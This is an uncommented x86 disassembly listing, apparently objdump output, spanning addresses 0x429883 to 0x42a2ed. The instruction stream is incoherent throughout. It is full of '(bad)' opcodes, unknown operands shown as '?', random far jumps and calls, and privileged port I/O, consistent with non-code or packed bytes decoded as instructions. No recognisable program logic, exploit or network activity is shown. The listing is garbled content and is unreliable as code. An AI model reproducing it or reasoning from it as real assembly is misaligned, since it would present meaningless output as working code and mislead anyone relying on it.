  429883:	adc    ch,BYTE PTR [ebx+0x7b5bff9a]
  429889:	xor    BYTE PTR [eax-0x6d3bf1df],bh
  42988f:	rcl    BYTE PTR [ebp+ebp*4+0x25],1
  429893:	test   eax,0x58414902
  429898:	fwait
  429899:	call   0xa727:0x4168e628
  4298a0:	aaa    
  4298a1:	retf   0x9929
  4298a4:	jle    0x4298b3
  4298a6:	mov    ecx,DWORD PTR [esi-0x1256cf22]
  4298ac:	call   0x2ca3:0x92dc3e78
  4298b3:	in     eax,dx
  4298b4:	push   ecx
  4298b5:	xchg   ebp,eax
  4298b6:	and    al,0x2a
  4298b8:	cmc    
  4298b9:	ret    0x1bd2
  4298bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298be:	call   0xbc7c21d6
  4298c3:	cmp    eax,0x17e47973
  4298c8:	loope  0x4298b9
  4298ca:	inc    edx
  4298cb:	cdq    
  4298cc:	fdiv   DWORD PTR [eax]
  4298ce:	in     eax,0x5f
  4298d0:	(bad)  
  4298d2:	push   ss
  4298d3:	push   eax
  4298d4:	mov    edx,0x4278e078
  4298d9:	out    0x88,eax
  4298db:	lea    ebp,[eax+0x7ddc1453]
  4298e1:	gs cld 
  4298e3:	jecxz  0x429942
  4298e5:	sbb    DWORD PTR [ebp+0x49c73d06],0x93e22cb
  4298ef:	mov    WORD PTR [ebp-0x5a],?
  4298f2:	sbb    al,0x2a
  4298f4:	jbe    0x4298d1
  4298f6:	pop    ss
  4298f7:	and    eax,0x48918e9c
  4298fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298fd:	adc    ecx,esp
  4298ff:	cmp    BYTE PTR [eax],bh
  429901:	cmc    
  429902:	inc    esi
  429903:	dec    ebp
  429904:	dec    eax
  429905:	sahf   
  429906:	mov    eax,ds:0xcf73b90e
  42990b:	jl     0x42995a
  42990d:	mov    BYTE PTR [esp+ecx*1+0x2496d33c],dh
  429914:	xchg   ebp,eax
  429915:	out    dx,eax
  429916:	lods   eax,DWORD PTR ds:[esi]
  429917:	jl     0x429910
  429919:	loop   0x4298ed
  42991b:	scas   eax,DWORD PTR es:[edi]
  42991c:	rcl    ch,cl
  42991e:	stos   DWORD PTR es:[edi],eax
  42991f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429920:	inc    esi
  429921:	cmp    DWORD PTR [esi-0x4a9536c1],esi
  429927:	fxam   
  429929:	shr    DWORD PTR [ecx+0x4833d301],1
  42992f:	arpl   WORD PTR [ecx+0x739f8f81],dx
  429935:	add    DWORD PTR [esi-0x34c32faf],ecx
  42993b:	icebp  
  42993c:	sbb    ebp,esp
  42993e:	arpl   WORD PTR [esi+eiz*8-0x6ef4b51],sp
  429945:	xchg   ebp,eax
  429946:	sbb    edi,edx
  429948:	enter  0x92ca,0x8e
  42994c:	xchg   BYTE PTR [ebx],ch
  42994e:	cmp    al,0xe2
  429950:	test   BYTE PTR [edi],bh
  429952:	in     al,0xb
  429954:	mov    DWORD PTR [edi*1-0x221c41d3],0x5f5a2417
  42995f:	test   eax,0x16d42db4
  429964:	ss cmp esp,ecx
  429967:	(bad)  
  429968:	retf   
  429969:	(bad)  
  42996a:	adc    BYTE PTR [ebp-0x12],ch
  42996d:	in     al,0x0
	...
  4299d3:	add    BYTE PTR [eax],al
  4299d5:	add    BYTE PTR [edi+0x68],dl
  4299d8:	fistp  QWORD PTR fs:[edi-0x21]
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	xchg   ecx,eax
  4299e3:	(bad)  
  4299e4:	push   edi
  4299e5:	push   eax
  4299e6:	addr16 mov esi,0x1000001
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	pushf  
  4299ef:	pop    ss
  4299f0:	fmul   DWORD PTR [ebp-0x62]
  4299f3:	ret    
  4299f4:	rcr    ch,0x91
  4299f7:	icebp  
  4299f8:	popa   
  4299f9:	sbb    al,0x14
  4299fb:	out    0x52,al
  4299fd:	jmp    0xa3dc279d
  429a02:	iret   
  429a03:	repz enter 0x6533,0xe5
  429a08:	adc    eax,0x1b133b02
  429a0d:	lock xchg edi,eax
  429a0f:	pop    ebx
  429a10:	and    bl,BYTE PTR [edx-0x79a70d30]
  429a16:	adc    cl,bh
  429a18:	and    ah,BYTE PTR [edi]
  429a1a:	dec    esp
  429a1b:	adc    eax,0x2f6ff756
  429a20:	jecxz  0x4299f5
  429a22:	pop    eax
  429a23:	mov    esi,DWORD PTR [edi-0x6]
  429a26:	cmp    al,0xe6
  429a28:	(bad)  
  429a29:	mov    BYTE PTR [eax-0xc],dl
  429a2c:	test   DWORD PTR gs:[ebp-0x6961e466],ebx
  429a33:	mul    DWORD PTR [ebx-0x34e0c899]
  429a39:	xor    BYTE PTR [edx-0x64496edd],0x70
  429a40:	sub    BYTE PTR [eax+edi*1-0x38d84986],ah
  429a47:	pop    ebx
  429a48:	mov    esp,0xbe6aa8bd
  429a4d:	xlat   BYTE PTR ds:[ebx]
  429a4e:	cdq    
  429a4f:	mov    cl,0xa6
  429a51:	pusha  
  429a52:	jp     0x429a78
  429a54:	ret    
  429a55:	mov    dh,0xbc
  429a57:	cld    
  429a58:	or     bh,bl
  429a5a:	enter  0xfcd,0x77
  429a5e:	cmc    
  429a5f:	adc    al,0x1a
  429a61:	das    
  429a62:	and    DWORD PTR [eax],ecx
  429a64:	mov    eax,ds:0xd98454a
  429a69:	out    0x77,al
  429a6b:	xor    al,0xc6
  429a6d:	in     al,0x29
  429a6f:	nop
  429a70:	jmp    0x6a56:0x5a5e62f3
  429a77:	dec    ebp
  429a78:	xlat   BYTE PTR ds:[ebx]
  429a79:	dec    ebx
  429a7a:	jnp    0x429a8f
  429a7c:	data16 mov al,ds:0x98faf08
  429a82:	add    BYTE PTR [edi+0x6b],dh
  429a85:	push   esp
  429a86:	mov    bh,0x7b
  429a88:	pop    es
  429a89:	ficom  WORD PTR [edx]
  429a8b:	push   edx
  429a8c:	push   edx
  429a8d:	inc    esp
  429a8e:	out    dx,eax
  429a8f:	scas   eax,DWORD PTR es:[edi]
  429a90:	je     0x429a54
  429a92:	jmp    0x429a29
  429a94:	sub    al,0x44
  429a96:	div    cl
  429a98:	sar    DWORD PTR [ecx],cl
  429a9a:	or     edx,DWORD PTR [ebx]
  429a9c:	outs   dx,DWORD PTR ds:[esi]
  429a9d:	add    ebx,ebp
  429a9f:	les    eax,FWORD PTR [esi+0x346c432f]
  429aa5:	sbb    DWORD PTR [ebp-0x3d4e3d0d],ecx
  429aab:	jno    0x429a4a
  429aad:	(bad)  
  429aae:	fdivp  st(7),st
  429ab0:	ret    0x11fb
  429ab3:	test   eax,0x3f0b45ef
  429ab8:	pop    esp
  429ab9:	dec    esp
  429aba:	or     al,0xc5
  429abc:	sbb    BYTE PTR [esi+0x45fddb96],0x33
  429ac3:	or     ch,BYTE PTR [edi+0x2a]
  429ac6:	cli    
  429ac7:	cwde   
  429ac8:	inc    esp
  429ac9:	xor    DWORD PTR [ecx],edx
  429acb:	test   al,0x4b
  429acd:	repnz mov dh,0x60
  429ad0:	out    dx,al
  429ad1:	add    ah,BYTE PTR [ebx+0x32a3dfe5]
  429ad7:	ss push edx
  429ad9:	jne    0x429b28
  429adb:	sbb    eax,DWORD PTR [ebp-0x28b842af]
  429ae1:	sub    eax,0xc06f70a8
  429ae6:	jecxz  0x429b63
  429ae8:	pop    ss
  429ae9:	fnstcw WORD PTR [eax]
  429aeb:	sub    dl,bl
  429aed:	(bad)  
	...
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0xb2a95667
  429b63:	ja     0x429b40
  429b65:	mov    ecx,0x1bf67
  429b6a:	add    BYTE PTR [ecx],al
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	mov    al,ds:0xf7587871
  429b73:	aaa    
  429b74:	aas    
  429b75:	sahf   
  429b76:	sahf   
  429b77:	mov    ecx,0xbb58d217
  429b7c:	jmp    0x1f10d881
  429b81:	cmp    eax,0x956aa254
  429b86:	div    BYTE PTR [ebx]
  429b88:	pcmpgtw mm4,QWORD PTR [edx+0x4da04691]
  429b8f:	xor    ebp,0x1c5e9b11
  429b95:	out    0x7b,al
  429b97:	loope  0x429c05
  429b99:	cmp    eax,0x578d9099
  429b9e:	out    dx,eax
  429b9f:	and    bl,cl
  429ba1:	sbb    ebx,DWORD PTR [ecx]
  429ba3:	and    bh,BYTE PTR [esi+edx*4+0x19]
  429ba7:	test   ch,ah
  429ba9:	scas   eax,DWORD PTR es:[edi]
  429baa:	xchg   esp,eax
  429bab:	mov    al,ds:0xbf115153
  429bb0:	ds test al,0xde
  429bb3:	icebp  
  429bb4:	dec    ebx
  429bb5:	mov    ds:0x40d6c7ff,al
  429bba:	jmp    0xca21efd8
  429bbf:	out    0x7d,eax
  429bc1:	mov    ecx,0x8f154a27
  429bc6:	lahf   
  429bc7:	icebp  
  429bc8:	and    eax,0x81baaad1
  429bcd:	dec    edi
  429bce:	xlat   BYTE PTR ds:[ebx]
  429bcf:	shl    BYTE PTR [eax-0x58],1
  429bd2:	in     eax,0xdb
  429bd4:	sar    bh,cl
  429bd6:	push   cs
  429bd7:	jmp    0x9046:0x8254475c
  429bde:	jb     0x429b8b
  429be0:	popf   
  429be1:	retf   0xbada
  429be4:	seta   dl
  429be7:	outs   dx,BYTE PTR ds:[esi]
  429be8:	xchg   DWORD PTR [ebx-0x5],eax
  429beb:	fild   QWORD PTR [edx+0x5a]
  429bee:	add    ah,BYTE PTR [edx+ebp*4-0x35fff7b0]
  429bf5:	jns    0x429c75
  429bf7:	enter  0xe48,0x73
  429bfb:	xlat   BYTE PTR ds:[ebx]
  429bfc:	lahf   
  429bfd:	cmp    al,0xac
  429bff:	xchg   edx,eax
  429c00:	adc    eax,0x6cbee273
  429c05:	xlat   BYTE PTR es:[ebx]
  429c07:	mov    ah,0x28
  429c09:	in     al,dx
  429c0a:	or     al,BYTE PTR [ebx+0x5c]
  429c0d:	aaa    
  429c0e:	or     eax,0x764a5a7c
  429c13:	mov    eax,0x4eb37f02
  429c18:	outs   dx,DWORD PTR ds:[esi]
  429c19:	loop   0x429c1f
  429c1b:	ja     0x429c56
  429c1d:	cmc    
  429c1e:	sub    cl,BYTE PTR [edx-0x608d369d]
  429c24:	into   
  429c25:	xchg   ecx,eax
  429c26:	mov    edi,0x93c5c5aa
  429c2b:	in     al,0xe9
  429c2d:	jne    0x429be4
  429c2f:	cmc    
  429c30:	popa   
  429c31:	cmp    eax,0x43385e8c
  429c36:	loope  0x429c9c
  429c38:	adc    dl,dh
  429c3a:	ds and eax,0x36fe7ceb
  429c40:	cli    
  429c41:	mov    dl,dh
  429c43:	xchg   ebx,eax
  429c44:	(bad)  
  429c45:	push   0xde9e323c
  429c4a:	mov    bh,0x8a
  429c4c:	and    cl,BYTE PTR ds:0x7a842070
  429c52:	arpl   di,cx
  429c54:	xchg   ch,bl
  429c56:	or     eax,0xe1f6a623
  429c5b:	aaa    
  429c5c:	cmc    
  429c5d:	test   al,0x91
  429c5f:	out    0x1f,eax
  429c61:	xor    cl,BYTE PTR [edx-0x60]
  429c64:	inc    eax
  429c65:	ret    0xc5d
  429c68:	jno    0x429c03
  429c6a:	stos   BYTE PTR es:[edi],al
  429c6b:	push   cs
  429c6c:	inc    ecx
	...
  429cd6:	mov    ds:0xb788a616,eax
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    BYTE PTR [ecx],ch
  429ce3:	jmp    0x429cdf
  429ce5:	dec    edi
  429ce6:	rol    BYTE PTR [bx+di],0x0
  429cea:	add    BYTE PTR [ecx],al
  429cec:	add    BYTE PTR [eax],al
  429cee:	jecxz  0x429d31
  429cf0:	pop    es
  429cf1:	fcmovb st,st(0)
  429cf3:	lea    ecx,[edi]
  429cf5:	retf   0x1942
  429cf8:	inc    esp
  429cf9:	ss pop ds
  429cfb:	cmp    ch,bh
  429cfd:	fucomp st(1)
  429cff:	sub    ebx,eax
  429d01:	push   es
  429d02:	or     DWORD PTR [edi+0x71],ecx
  429d05:	mov    ch,0x25
  429d07:	xchg   edi,eax
  429d08:	add    BYTE PTR [ecx+0x37],cl
  429d0b:	and    ebp,DWORD PTR [esi]
  429d0d:	mov    ds,WORD PTR [eax-0x75574f85]
  429d13:	ret    
  429d14:	jb     0x429d71
  429d16:	in     al,dx
  429d17:	and    bl,dh
  429d19:	jl     0x429d56
  429d1b:	sti    
  429d1c:	mov    eax,0x3ed3a6f2
  429d21:	(bad)  
  429d23:	dec    ebp
  429d24:	scas   eax,DWORD PTR es:[edi]
  429d25:	inc    esi
  429d26:	rcl    bh,1
  429d28:	popa   
  429d29:	imul   esp,eax,0x286f9e34
  429d2f:	mov    eax,ds:0xc932d024
  429d34:	mov    esi,ebx
  429d36:	stos   DWORD PTR es:[edi],eax
  429d37:	clc    
  429d38:	and    BYTE PTR [edx+eiz*4-0x68],ah
  429d3c:	pop    ecx
  429d3d:	and    BYTE PTR [esi],al
  429d3f:	ja     0x429d35
  429d41:	outs   dx,BYTE PTR ds:[esi]
  429d42:	mov    edi,0x831eabc4
  429d47:	and    eax,ebp
  429d49:	out    0xcc,al
  429d4b:	xchg   ebp,eax
  429d4c:	stc    
  429d4d:	lods   eax,DWORD PTR ds:[esi]
  429d4e:	icebp  
  429d4f:	mov    ah,0x89
  429d51:	jmp    0xfac1514f
  429d56:	scas   eax,DWORD PTR es:[edi]
  429d57:	popa   
  429d58:	adc    BYTE PTR [ebx],dh
  429d5a:	sub    esp,edx
  429d5c:	dec    esp
  429d5d:	daa    
  429d5e:	and    BYTE PTR [esi+ecx*2],dh
  429d61:	add    BYTE PTR [edx],dl
  429d63:	push   0xf55b1e4f
  429d68:	popf   
  429d69:	stos   DWORD PTR es:[edi],eax
  429d6a:	xor    al,0x43
  429d6c:	sub    DWORD PTR [ebx+0x2c484821],ecx
  429d72:	neg    BYTE PTR [edx+0xd]
  429d75:	fisttp WORD PTR [esi+0x1d]
  429d78:	fwait
  429d79:	mov    ebp,0xe0a583de
  429d7e:	mov    esp,0xa7d214fc
  429d83:	pop    ss
  429d84:	sub    ch,BYTE PTR [ebx+edi*4-0x22]
  429d88:	push   ebx
  429d89:	sbb    ebx,esp
  429d8b:	fnstenv ds:0x4d226d68
  429d91:	add    esi,edx
  429d93:	call   0x96b81625
  429d98:	hlt    
  429d99:	push   0xffffffed
  429d9b:	push   edi
  429d9c:	int3   
  429d9d:	aad    0x92
  429d9f:	jl     0x429d99
  429da1:	mov    ds,WORD PTR [ebp+0x7a94ba2a]
  429da7:	or     al,0x9b
  429da9:	sub    al,0xc9
  429dab:	add    eax,0xb2dd6b1e
  429db0:	das    
  429db1:	iret   
  429db2:	cli    
  429db3:	int3   
  429db4:	(bad)  
  429db5:	arpl   WORD PTR [edx],dx
  429db7:	scas   eax,DWORD PTR es:[edi]
  429db8:	mov    al,0x15
  429dba:	or     BYTE PTR [ecx+eiz*4],ah
  429dbd:	add    BYTE PTR [ebx+0x31],ah
  429dc0:	test   al,0xaa
  429dc2:	ja     0x429d87
  429dc4:	mov    BYTE PTR [ecx+ebx*8-0x35762c55],bl
  429dcb:	mov    ecx,DWORD PTR [edx-0x48]
  429dce:	addr16 adc esi,edx
  429dd1:	call   0x6afbf1c6
  429dd6:	cmp    ecx,ebp
  429dd8:	cmp    eax,0x3fe8aa38
  429ddd:	repnz imul edi
  429de0:	rcr    DWORD PTR [eax-0x2ee53f0d],0xf2
  429de7:	cmp    ebx,DWORD PTR [ebx-0xc]
  429dea:	minps  xmm3,xmm5
  429ded:	pop    ecx
	...
  429e56:	fwait
  429e57:	mov    bh,0xc4
  429e59:	or     al,0xec
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	mov    edi,0x67a33d65
  429e67:	rol    DWORD PTR [ecx],0x0
  429e6a:	add    BYTE PTR [ecx],al
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	jnp    0x429e46
  429e70:	xor    BYTE PTR [ecx-0x32],ch
  429e73:	jecxz  0x429ead
  429e75:	es jns 0x429ea9
  429e78:	pusha  
  429e79:	mov    edx,0x640ec83
  429e7e:	iret   
  429e7f:	add    DWORD PTR [ecx],0xc
  429e82:	ins    BYTE PTR es:[edi],dx
  429e83:	fwait
  429e84:	sub    DWORD PTR [esi+0x77],0xffffffbd
  429e88:	in     al,0x99
  429e8a:	test   DWORD PTR [ebp+edx*4-0x44804594],ecx
  429e91:	push   ss
  429e92:	inc    esi
  429e93:	rcr    al,cl
  429e95:	std    
  429e96:	pop    eax
  429e97:	int3   
  429e98:	jle    0x7c4b3136
  429e9e:	xchg   edx,eax
  429e9f:	out    0xd0,al
  429ea1:	mov    gs,WORD PTR [esi+0x2c]
  429ea4:	in     eax,0xc3
  429ea6:	push   si
  429ea8:	xor    bl,BYTE PTR [ecx+0x45]
  429eab:	jne    0x429ea6
  429ead:	sub    DWORD PTR [edx-0x4a6035ca],esp
  429eb3:	mov    eax,ds:0x53153eb1
  429eb8:	or     ebx,DWORD PTR [ecx+0x62]
  429ebb:	ss adc edi,esi
  429ebe:	xchg   esi,eax
  429ebf:	sti    
  429ec0:	dec    edi
  429ec1:	sti    
  429ec2:	cdq    
  429ec3:	adc    al,0x26
  429ec5:	scas   al,BYTE PTR es:[edi]
  429ec6:	mov    ds:0xe2d136f2,eax
  429ecb:	adc    edi,esi
  429ecd:	jns    0x429f1c
  429ecf:	inc    ebp
  429ed0:	push   ss
  429ed1:	add    BYTE PTR [ecx],ah
  429ed3:	lahf   
  429ed4:	std    
  429ed5:	jecxz  0x429e60
  429ed7:	imul   edx,DWORD PTR [eax+0x38],0x26055b28
  429ede:	mov    ebp,0x63188bf0
  429ee3:	mov    eax,0xf7191e08
  429ee8:	pop    es
  429ee9:	fstp   QWORD PTR [esi]
  429eeb:	xor    al,0x69
  429eed:	shl    DWORD PTR [edi-0x2],1
  429ef0:	call   DWORD PTR [ecx-0x585f4594]
  429ef6:	enter  0x3398,0xc4
  429efa:	ret    0x888
  429efd:	test   al,0x8a
  429eff:	loope  0x429ec3
  429f01:	lahf   
  429f02:	jp     0x429f5a
  429f04:	mov    eax,ds:0x23cf8ca7
  429f09:	inc    ebp
  429f0a:	not    BYTE PTR [eax+0x31238ce]
  429f10:	pop    eax
  429f11:	add    al,0x8f
  429f13:	xor    DWORD PTR [ecx+0x62],esp
  429f16:	sbb    dh,BYTE PTR [eax-0x25]
  429f19:	inc    esp
  429f1a:	and    al,0x4
  429f1c:	adc    BYTE PTR [ebx-0x33],bh
  429f1f:	ins    DWORD PTR es:[edi],dx
  429f20:	dec    esp
  429f21:	out    0xa2,al
  429f23:	push   edi
  429f24:	gs pop edx
  429f26:	es (bad) 
  429f28:	sbb    al,bh
  429f2a:	test   eax,0xd8cb08bb
  429f2f:	sbb    esp,eax
  429f31:	les    ebp,FWORD PTR [ebp+edi*1+0x72]
  429f35:	pop    ecx
  429f36:	push   edi
  429f37:	test   BYTE PTR [edi+0x76],0xce
  429f3b:	sbb    DWORD PTR [ecx],0xffffff8c
  429f3e:	cmova  edi,DWORD PTR ds:0x9f342ad8
  429f45:	mov    ?,WORD PTR [eax-0x78cef171]
  429f4b:	sub    eax,0x90563978
  429f50:	push   esp
  429f51:	test   al,0x2e
  429f53:	js     0x429f37
  429f55:	das    
  429f56:	loop   0x429ef8
  429f58:	push   ebx
  429f59:	(bad)  
  429f5a:	push   cs
  429f5b:	(bad)  
  429f5c:	shr    BYTE PTR [edx],cl
  429f5e:	clc    
  429f5f:	addr16 adc al,0x10
  429f62:	std    
  429f63:	add    dl,BYTE PTR [edi-0x414c9df7]
  429f69:	out    dx,eax
  429f6a:	ins    DWORD PTR es:[edi],dx
  429f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f6c:	dec    edx
  429f6d:	adc    al,0x0
	...
  429fd3:	add    BYTE PTR [eax],al
  429fd5:	add    BYTE PTR [ecx],dh
  429fd7:	inc    ebp
  429fd8:	enter  0xfc06,0x8f
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx+0x521c0f87]
  429fe6:	addr16 ret 0x1
  429fea:	add    BYTE PTR [ecx],al
  429fec:	add    BYTE PTR [eax],al
  429fee:	inc    ebp
  429ff0:	fldpi  
  429ff2:	and    ah,dh
  429ff4:	inc    esi
  429ff5:	push   cs
  429ff6:	les    edi,FWORD PTR ds:0x43a731c5
  429ffc:	adc    DWORD PTR [edx+0x45],edx
  429fff:	daa    
  42a000:	or     ecx,edi
  42a002:	or     esp,DWORD PTR [ebp-0x74ed84ff]
  42a008:	inc    esi
  42a009:	pop    ebx
  42a00a:	mov    BYTE PTR [ecx+0x63],cl
  42a00d:	add    DWORD PTR [esi-0x26b5372d],esi
  42a013:	loop   0x42a090
  42a015:	ret    0x235d
  42a018:	arpl   WORD PTR [eax+esi*2-0x33],dx
  42a01c:	fmul   st,st(2)
  42a01e:	in     al,dx
  42a01f:	push   ebp
  42a020:	xchg   ebx,eax
  42a021:	cmp    bl,BYTE PTR cs:[ecx-0x74]
  42a025:	mov    bl,0x3
  42a027:	pushf  
  42a028:	stc    
  42a029:	mov    ds:0xd2f93ecf,eax
  42a02e:	daa    
  42a02f:	xor    bh,dl
  42a031:	push   edx
  42a032:	mov    esp,0x968c53a7
  42a037:	scas   eax,DWORD PTR es:[edi]
  42a038:	bound  edi,QWORD PTR [esi]
  42a03a:	daa    
  42a03b:	shr    BYTE PTR [eax+0x75],cl
  42a03e:	ffreep st(4)
  42a040:	xor    BYTE PTR [edx+0x4af015de],bl
  42a046:	mov    edx,0xc9b17e7
  42a04b:	or     ch,BYTE PTR [ebx]
  42a04d:	pop    edx
  42a04e:	pop    esp
  42a04f:	cmp    ebx,DWORD PTR [esi-0x28579a0d]
  42a055:	lods   al,BYTE PTR ds:[esi]
  42a056:	ja     0x42a008
  42a058:	aas    
  42a059:	mov    al,0xca
  42a05b:	mov    dh,0xf0
  42a05d:	cmc    
  42a05e:	out    dx,al
  42a05f:	sub    ah,BYTE PTR [edx-0x635f1ea9]
  42a065:	dec    esi
  42a066:	jge    0x429ffe
  42a068:	fwait
  42a069:	not    BYTE PTR [ebp-0x5ece7d91]
  42a06f:	push   ds
  42a070:	adc    al,0x8e
  42a072:	fisub  DWORD PTR [edi+0x163a25ed]
  42a078:	or     eax,0x9154ea03
  42a07d:	add    al,cl
  42a07f:	or     BYTE PTR [ebp-0x56a8ba7b],bl
  42a085:	outs   dx,DWORD PTR ds:[esi]
  42a086:	sbb    BYTE PTR [esi],bh
  42a088:	int3   
  42a089:	je     0x42a095
  42a08b:	dec    esp
  42a08c:	dec    eax
  42a08d:	pop    ds
  42a08e:	call   0x6422:0xfcc093c2
  42a095:	call   0x21bf:0x8c006004
  42a09c:	js     0x42a04f
  42a09e:	jmp    0x4af9b54c
  42a0a3:	pop    ecx
  42a0a4:	fxch   st(0)
  42a0a6:	inc    esi
  42a0a7:	dec    ecx
  42a0a8:	xor    DWORD PTR [edx],esi
  42a0aa:	(bad)  
  42a0ab:	ret    
  42a0ac:	hlt    
  42a0ad:	out    dx,al
  42a0ae:	add    DWORD PTR [eax+0x16ed7f91],ebp
  42a0b4:	xchg   ebx,eax
  42a0b5:	fdivr  DWORD PTR [edi-0x3b8d20e0]
  42a0bb:	xor    ebx,DWORD PTR [esi]
  42a0bd:	popa   
  42a0be:	out    0x17,al
  42a0c0:	xor    BYTE PTR [edi],ah
  42a0c2:	mov    ecx,0xad3fac88
  42a0c7:	pop    ss
  42a0c8:	mov    ch,0xb5
  42a0ca:	mov    al,0x3f
  42a0cc:	xchg   ebx,eax
  42a0cd:	shl    BYTE PTR [edx-0x4a],cl
  42a0d0:	(bad)  
  42a0d1:	stos   BYTE PTR es:[edi],al
  42a0d2:	xchg   ebx,eax
  42a0d3:	(bad)  
  42a0d4:	(bad)  
  42a0d6:	jmp    0xc4a6:0xe0adcf95
  42a0dd:	xchg   ebp,eax
  42a0de:	push   ss
  42a0df:	mov    cl,0x1d
  42a0e1:	sbb    ecx,DWORD PTR [ebp+0x76]
  42a0e4:	sti    
  42a0e5:	in     eax,0x45
  42a0e7:	(bad)  
  42a0e8:	aam    0x6b
  42a0ea:	dec    eax
  42a0eb:	mov    ebp,DWORD PTR [esi+0x1d]
	...
  42a156:	xlat   BYTE PTR ds:[ebx]
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	jmp    0x42a18a
  42a164:	nop
  42a165:	mov    eax,ds:0x1c367
  42a16a:	add    BYTE PTR [ecx],al
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	xchg   DWORD PTR [esi+0x3a],edi
  42a171:	pop    ebx
  42a172:	dec    ebp
  42a173:	mov    fs,WORD PTR [eax+0x341ed068]
  42a179:	pop    ds
  42a17a:	ret    0xa76e
  42a17d:	into   
  42a17e:	or     cl,BYTE PTR [ebp-0x7822bba7]
  42a184:	out    0xcc,eax
  42a186:	mov    cl,0x21
  42a188:	leave  
  42a189:	loop   0x42a175
  42a18b:	call   0x3ba3:0xaac007c0
  42a192:	das    
  42a193:	jno    0x42a15a
  42a195:	stc    
  42a196:	mov    esi,0x1cf13cff
  42a19b:	mov    ecx,0x596efccb
  42a1a0:	stos   BYTE PTR es:[edi],al
  42a1a1:	(bad)  
  42a1a2:	xchg   esp,eax
  42a1a3:	cwde   
  42a1a4:	(bad)  
  42a1a5:	out    0x6a,al
  42a1a7:	ficom  DWORD PTR [esi]
  42a1a9:	ds dec ebp
  42a1ab:	mov    bh,0x7c
  42a1ad:	xchg   dh,bl
  42a1af:	xchg   esi,eax
  42a1b0:	cld    
  42a1b1:	rol    DWORD PTR [esi+edi*4],1
  42a1b4:	loopne 0x42a1ed
  42a1b6:	jne    0x42a1cc
  42a1b8:	xor    eax,0x9f544b4a
  42a1bd:	ss js  0x42a1b9
  42a1c0:	idiv   cx
  42a1c3:	adc    bh,dl
  42a1c5:	dec    esi
  42a1c6:	ret    
  42a1c7:	cmc    
  42a1c8:	aas    
  42a1c9:	mov    WORD PTR [ecx],?
  42a1cb:	retf   
  42a1cc:	lods   eax,DWORD PTR ds:[esi]
  42a1cd:	shl    BYTE PTR [eax],cl
  42a1cf:	int    0x21
  42a1d1:	out    dx,al
  42a1d2:	pop    ss
  42a1d3:	dec    ebx
  42a1d4:	stc    
  42a1d5:	inc    edx
  42a1d6:	cld    
  42a1d7:	iret   
  42a1d8:	mov    bl,0x11
  42a1da:	inc    edx
  42a1db:	jne    0x42a183
  42a1dd:	fadd   DWORD PTR [ebx]
  42a1df:	cmc    
  42a1e0:	mov    ebp,0xae47ce2c
  42a1e5:	dec    ecx
  42a1e6:	rcl    esi,0xf6
  42a1e9:	xor    ebp,esi
  42a1eb:	mov    eax,0x1c788527
  42a1f0:	or     eax,0xeef7178
  42a1f5:	xlat   BYTE PTR ds:[ebx]
  42a1f6:	xor    al,0x58
  42a1f8:	or     BYTE PTR [ebx+0x2ca361d],0x35
  42a1ff:	outs   dx,BYTE PTR ds:[esi]
  42a200:	cmp    ecx,DWORD PTR [ebx-0xf]
  42a203:	daa    
  42a204:	add    BYTE PTR [esi+0x6617972d],ch
  42a20a:	mov    DWORD PTR [ebx+0x1cb946],edx
  42a210:	aaa    
  42a211:	push   esi
  42a212:	jp     0x42a1aa
  42a214:	dec    ebp
  42a215:	dec    ebp
  42a216:	pop    edx
  42a217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a218:	fmul   DWORD PTR [edi+0x77676315]
  42a21e:	and    ebp,esp
  42a220:	jnp    0x42a28e
  42a222:	xchg   edi,eax
  42a223:	push   ss
  42a224:	mov    esi,0xf51a35e7
  42a229:	test   eax,0xd95c3858
  42a22e:	dec    ebp
  42a22f:	sub    ah,bl
  42a231:	ins    DWORD PTR es:[edi],dx
  42a232:	fcomp  QWORD PTR [ebx+edx*4-0x18]
  42a236:	std    
  42a237:	pop    eax
  42a238:	xchg   edx,eax
  42a239:	dec    edx
  42a23a:	or     bh,0x14
  42a23d:	repz aaa 
  42a23f:	xor    esi,DWORD PTR [ebx]
  42a241:	repz mov ebx,0x9781394c
  42a247:	ja     0x42a1fb
  42a249:	adc    al,0x1e
  42a24b:	stos   BYTE PTR es:[edi],al
  42a24c:	in     eax,0x38
  42a24e:	cmc    
  42a24f:	rcl    DWORD PTR [edx-0xcb53c41],1
  42a255:	enter  0x8bce,0x61
  42a259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a25a:	fs and ebp,esi
  42a25d:	sub    ah,ah
  42a25f:	push   eax
  42a260:	jmp    0x42a1f3
  42a262:	jle    0x42a1f7
  42a264:	mov    al,ds:0xfbd8bfe8
  42a269:	inc    esp
  42a26a:	adc    eax,0xb7dc1
	...
  42a2d3:	add    BYTE PTR [eax],al
  42a2d5:	add    BYTE PTR [ebx],ch
  42a2d7:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fld    DWORD PTR [edx]
  42a2e3:	cmc    
  42a2e4:	xchg   esp,ecx
  42a2e6:	les    eax,FWORD PTR [bx+di]
  42a2e9:	add    BYTE PTR [eax],al
  42a2eb:	add    DWORD PTR [eax],eax
  42a2ed:	add    BYTE PTR [edi-0x73],bh
